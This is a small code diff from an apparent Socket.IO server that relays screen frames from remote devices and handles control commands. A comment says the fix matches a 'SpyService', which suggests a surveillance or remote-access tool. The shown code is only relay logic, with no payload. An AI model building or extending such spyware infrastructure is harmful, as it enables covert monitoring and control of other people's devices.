@@ -54,12 +54,14 @@ io.on('connection', (socket) => {
         }
     });
 
-    socket.on('screen-frame', (data) => {
-        const deviceId = data.deviceId;
-        if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('screen-update', data);
-        }
-    });
+   socket.on('screen-frame', (data) => {
+    const deviceId = data.deviceId;
+    if (devices.has(deviceId)) {
+        // ✅ FIXED: Emit to 'screen-frame' (matches SpyService)
+        socket.to(deviceId).emit('screen-frame', data);
+        console.log(`📱 Frame from ${deviceId}: ${data.size} bytes`);
+    }
+});
 
     // Control commands
     socket.on('control', (data) => {
